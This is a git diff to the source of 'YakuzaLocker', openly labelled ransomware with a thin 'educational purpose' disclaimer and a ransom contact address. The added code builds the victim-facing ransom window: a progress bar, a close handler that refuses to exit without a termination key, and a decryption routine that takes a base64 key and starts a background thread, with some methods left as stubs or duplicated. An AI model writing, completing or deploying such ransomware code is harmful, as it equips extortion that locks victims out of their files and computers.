@@ -3,17 +3,19 @@ Main file to Combine all Components of YakuzaLocker together
 Author: Yakuza-D
 Disclaimer: this app written only and only for educational purpose
 """
-
+import binascii
 import logging
 import sys
-from base64 import b64encode
+from base64 import b64encode, b64decode
+import base64
 from ctypes import windll
 from datetime import datetime
 from json import dumps
 from os import makedirs, path, remove, walk
 # import tkinter as tk
 from tkinter import Toplevel, Entry, Label, Button, simpledialog, FLAT, messagebox, Tk, END, Listbox, Frame, BOTH, X, \
-    TOP, LEFT, Scrollbar, Text, RIGHT
+    TOP, LEFT, Scrollbar, Text, RIGHT, HORIZONTAL
+from tkinter.ttk import Style, Progressbar
 from uuid import uuid4
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
@@ -748,12 +750,6 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             messagebox.showerror("Error", "Incorrect secondary termination key.")
 
 
-    def on_close_window(self):
-        pass
-
-    def load_timer_state(self):
-        pass
-
     # Function to submit log messages
     def log(self, message, color='green'):
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -801,10 +797,71 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         Button(keyFrame, text="START DECRYPTION", bg='#d9534f', fg='white', font=('Helvetica CE', 12), relief=FLAT,
                command=self.start_decryption).pack(side=RIGHT, padx=(10, 0))
 
-
-
+    # Function to Setting UP the progress frame
     def setup_progress_frame(self):
+        # Create Progress frame
+        self.progressFrame = Frame(self, bg='black')
+        self.progressFrame.pack(fill=X, padx=10, pady=20)
+
+        # Create Style, Set Theme and Configure Progressbar
+        style = Style()
+        style.theme_use('clam')
+        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)
+
+        # Create Progressbar and pack it
+        self.progress = Progressbar(self.progressFrame, style="Enhanced.Horizontal.TProgressbar",
+                                    orient=HORIZONTAL, length=400, mode='determinate')
+        self.progress.pack(fill=X, expand=True)
+
+        # Create label for Progressbar
+        self.progressLabel = Label(self.progressFrame, text="Decryption Progress: 0%", fg='white', bg='black')
+        self.progressLabel.pack()
+
+    # Function to handle window close event
+    def on_close_window(self):
+        dialog = TerminationKeyDialog(self, ICON_PATH)
+        self.wait_window(dialog)
+
+        if dialog.result == TERMINATION_KEY:
+            self.destroy()
+        else:
+            messagebox.showerror("Error", "Incorrect termination key.")
+            return
+
+    """ Part 8: Decryption Process Methods
+    Step 38 to Step 43 """
+
+    # Function to start the decryption process
+    def start_decryption(self):
+        # Get a Decryption key from Entry
+        decryptionKey = self.keyEntry.get()
+        if decryptionKey:
+            try:
+                # Base64 decode decryption key
+                key = b64decode(decryptionKey)
+                self.log("Starting scan and decryption automatically.")
+
+                # Reset timer Update ID
+                if self.timerUpdateId:
+                    self.after_cancel(self.timerUpdateId)
+                    self.timerUpdateId = None
+
+                # Run scan_and_decrypt() on multithreading mode to Find and Decrypt all encrypted files
+                Thread(target=self.scan_and_decrypt, args=(key,), daemon=True).start()
+
+            except binascii.Error:
+                messagebox.showerror("Error", "[-] Invalid decryption key. Please check the key and try again.")
+        else:
+            messagebox.showerror("Error", "[-] Decryption key is not provided.")
+
+    # Function to scan and decrypt files
+    def scan_and_decrypt(self):
         pass
+
+
+    def load_timer_state(self):
+        pass
+
 
     def start_decryption(self):
         pass
